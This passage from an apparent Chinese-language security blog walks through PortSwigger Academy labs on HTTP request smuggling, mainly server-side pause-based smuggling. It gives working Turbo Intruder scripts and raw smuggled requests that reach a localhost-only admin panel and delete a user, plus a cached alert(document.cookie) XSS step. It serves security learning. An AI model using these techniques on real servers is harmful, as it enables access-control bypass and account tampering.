+<p>这里的目的大概就是先包含进&#x2F;resources&#x2F;js&#x2F;analytics.js 缓存 其中缓存的内容就是alert(document.cookie); 原因就是其他的页面已经被注释了  再跳转到含有js页面的 login页面</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219235704173.png" alt="image-20221219235704173"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219235555069.png" alt="image-20221219235555069"></p>
+<h1 id="服务器端基于暂停的请求走私"><a href="#服务器端基于暂停的请求走私" class="headerlink" title="服务器端基于暂停的请求走私"></a>服务器端基于暂停的请求走私</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221220091816720.png" alt="image-20221220091816720"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221220124649693.png" alt="image-20221220124649693"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /resources/images HTTP/1.1</span><br><span class="line">Host: 0a60008a04ff8ce8c4059128004500cc.web-security-academy.net</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">GET /404page/ HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+
+<p>尝试构造一个这样的请求 并将其发送到 Turbo intruder</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221220134320640.png" alt="image-20221220134320640"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">                           concurrentConnections=<span class="number">1</span>,</span><br><span class="line">                           <span class="comment">#这里代表同时连接的的数量</span></span><br><span class="line">                           requestsPerConnection=<span class="number">100</span>,</span><br><span class="line">                           <span class="comment">#每一个连接的请求数</span></span><br><span class="line">                           pipeline=<span class="literal">False</span></span><br><span class="line">                           <span class="comment">#是否启用管道</span></span><br><span class="line">                           )</span><br><span class="line"></span><br><span class="line">    engine.queue(target.req, pauseMarker=[<span class="string">&#x27;\r\n\r\n&#x27;</span>], pauseTime=<span class="number">60000</span>)</span><br><span class="line">    <span class="comment">#pauseMarker 这里表示在发送请求时在那个字符串的位置停止  pauseTime表示暂停的时间 这里的意思就是在 GET /404page/之前停止并且停止60秒</span></span><br><span class="line">    followUp = <span class="string">&#x27;GET / HTTP/1.1\r\nHost: 0a60008a04ff8ce8c4059128004500cc.web-security-academy.net\r\n\r\n&#x27;</span></span><br><span class="line">    engine.queue(followUp)</span><br><span class="line">    <span class="comment">#这里添加一个新的请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    table.add(req)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>填写如下脚本</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221220135825657.png" alt="image-20221220135825657"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221220135958481.png" alt="image-20221220135958481"></p>
+<p>发现收到一个 302 和一个 404 页面</p>
+<p>尝试走私 admin页面 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221220140738020.png" alt="image-20221220140738020"></p>
+<p>发现只能从本地访问</p>
+<p>重新构造一下请求  将Host改为 localhost</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">                           concurrentConnections=<span class="number">1</span>,</span><br><span class="line">                           requestsPerConnection=<span class="number">100</span>,</span><br><span class="line">                           pipeline=<span class="literal">False</span></span><br><span class="line">                           )</span><br><span class="line"></span><br><span class="line">    engine.queue(target.req, pauseMarker=[<span class="string">&#x27;\r\n\r\n&#x27;</span>], pauseTime=<span class="number">61000</span>)</span><br><span class="line">    followUp = <span class="string">&#x27;GET / HTTP/1.1\r\nHost: localhost\r\n\r\n&#x27;</span></span><br><span class="line">    engine.queue(followUp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    table.add(req)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221220141621432.png" alt="image-20221220141621432"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /resources HTTP/1.1</span><br><span class="line">Host: 0a60008a04ff8ce8c4059128004500cc.web-security-academy.net</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 142</span><br><span class="line"></span><br><span class="line">POST /admin/delete/ HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: x-www-form-urlencoded</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">csrf=lC63uGgjDoyWzgzLF2txrCy8xJXPIxEf&amp;username=carlos</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">                           concurrentConnections=<span class="number">1</span>,</span><br><span class="line">                           requestsPerConnection=<span class="number">500</span>,</span><br><span class="line">                           pipeline=<span class="literal">False</span></span><br><span class="line">                           )</span><br><span class="line"></span><br><span class="line">    engine.queue(target.req, pauseMarker=[<span class="string">&#x27;Content-Length: 53\r\n\r\n&#x27;</span>], pauseTime=<span class="number">61000</span>)</span><br><span class="line">    engine.queue(target.req)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    table.add(req)</span><br></pre></td></tr></table></figure>
+
+<p>为了防止停止两次 pauseMarker&#x3D;[‘Content-Length: 53\r\n\r\n’] 需要修改停止位置</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221220143603360.png" alt="image-20221220143603360"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221220143552724.png" alt="image-20221220143552724"></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/burp/">burp</a><a class="post-meta__tags" href="/tags/smuggling/">smuggling</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/f0d54cf4.html"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2016/11/25/23/15/moon-1859616_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HTTP Host header attacks</div></div></a></div><div class="next-post pull-right"><a href="/dabf65a0.html"><img class="next-cover" src="https://cdn.pixabay.com/photo/2017/05/09/03/46/alberta-2297204_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Information disclosure</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/424af0ec.html" title="Access control vulnerabilities"><img class="cover" src="https://cdn.pixabay.com/photo/2018/06/09/17/25/trees-3464777_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-08</div><div class="title">Access control vulnerabilities</div></div></a></div><div><a href="/6da97099.html" title="Business logic vulnerabilities"><img class="cover" src="https://cdn.pixabay.com/photo/2016/10/22/17/46/mountains-1761292_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-08</div><div class="title">Business logic vulnerabilities</div></div></a></div><div><a href="/120e7910.html" title="Clickjacking"><img class="cover" src="https://cdn.pixabay.com/photo/2017/07/19/01/41/clouds-2517653_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-08</div><div class="title">Clickjacking</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%8C%E5%9F%BA%E6%9C%AC-CL-TE-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">HTTP 请求走私，基本 CL.TE 漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%8C%E5%9F%BA%E6%9C%AC-TE-CL-%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">HTTP 请求走私，基本 TE.CL 漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%8C%E6%B7%B7%E6%B7%86-TE-%E6%A0%87%E5%A4%B4"><span class="toc-number">3.</span> <span class="toc-text">HTTP 请求走私，混淆 TE 标头</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%8C%E9%80%9A%E8%BF%87%E5%B7%AE%E5%BC%82%E5%93%8D%E5%BA%94%E7%A1%AE%E8%AE%A4-CL-TE-%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">HTTP 请求走私，通过差异响应确认 CL.TE 漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%8C%E9%80%9A%E8%BF%87%E5%B7%AE%E5%BC%82%E5%93%8D%E5%BA%94%E7%A1%AE%E8%AE%A4-TE-CL-%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">HTTP 请求走私，通过差异响应确认 TE.CL 漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6%EF%BC%8CCL-TE-%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">利用 HTTP 请求走私绕过前端安全控制，CL.TE 漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6%EF%BC%8CTE-CL-%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">利用 HTTP 请求走私绕过前端安全控制，TE.CL 漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%9D%A5%E6%8F%AD%E7%A4%BA%E5%89%8D%E7%AB%AF%E8%AF%B7%E6%B1%82%E9%87%8D%E5%86%99"><span class="toc-number">8.</span> <span class="toc-text">利用 HTTP 请求走私来揭示前端请求重写</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%9D%A5%E6%8D%95%E8%8E%B7%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%B7%E6%B1%82"><span class="toc-number">9.</span> <span class="toc-text">利用 HTTP 请求走私来捕获其他用户的请求</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%9D%A5%E4%BC%A0%E9%80%92%E5%8F%8D%E5%B0%84-XSS"><span class="toc-number">10.</span> <span class="toc-text">利用 HTTP 请求走私来传递反射 XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-H2-TE-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%9A%84%E5%93%8D%E5%BA%94%E9%98%9F%E5%88%97%E4%B8%AD%E6%AF%92"><span class="toc-number">11.</span> <span class="toc-text">通过 H2.TE 请求走私的响应队列中毒</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#H2-CL-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">12.</span> <span class="toc-text">H2.CL 请求走私</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-CRLF-%E6%B3%A8%E5%85%A5%E7%9A%84-HTTP-x2F-2-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">13.</span> <span class="toc-text">通过 CRLF 注入的 HTTP&#x2F;2 请求走私</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-CRLF-%E6%B3%A8%E5%85%A5%E6%8B%86%E5%88%86-HTTP-x2F-2-%E8%AF%B7%E6%B1%82"><span class="toc-number">14.</span> <span class="toc-text">通过 CRLF 注入拆分 HTTP&#x2F;2 请求</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CL-0-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">15.</span> <span class="toc-text">CL.0 请求走私</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%9D%A5%E6%89%A7%E8%A1%8C-Web-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="toc-number">16.</span> <span class="toc-text">利用 HTTP 请求走私来执行 Web 缓存中毒</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%9D%A5%E6%89%A7%E8%A1%8C-Web-%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97"><span class="toc-number">17.</span> <span class="toc-text">利用 HTTP 请求走私来执行 Web 缓存欺骗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-HTTP-x2F-2-%E8%AF%B7%E6%B1%82%E9%9A%A7%E9%81%93%E7%BB%95%E8%BF%87%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">18.</span> <span class="toc-text">通过 HTTP&#x2F;2 请求隧道绕过访问控制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-HTTP-x2F-2-%E8%AF%B7%E6%B1%82%E9%9A%A7%E9%81%93%E7%9A%84-Web-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"><span class="toc-number">19.</span> <span class="toc-text">通过 HTTP&#x2F;2 请求隧道的 Web 缓存投毒</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Client-side-desync"><span class="toc-number">20.</span> <span class="toc-text">Client-side desync</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8D%E5%90%8C%E6%AD%A5%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="toc-number">21.</span> <span class="toc-text">通过客户端不同步的浏览器缓存中毒</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%9F%BA%E4%BA%8E%E6%9A%82%E5%81%9C%E7%9A%84%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">22.</span> <span class="toc-text">服务器端基于暂停的请求走私</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
+      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
+      avatar: 'monsterid',
+      serverURLs: 'https://valine.wanan.red',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://www.wanan.red/917f81d7.html'
+    this.page.identifier = '/917f81d7.html'
+    this.page.title = 'HTTP request smuggling'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://www-wanan-red.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script>(function(d, w, c) {
+    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
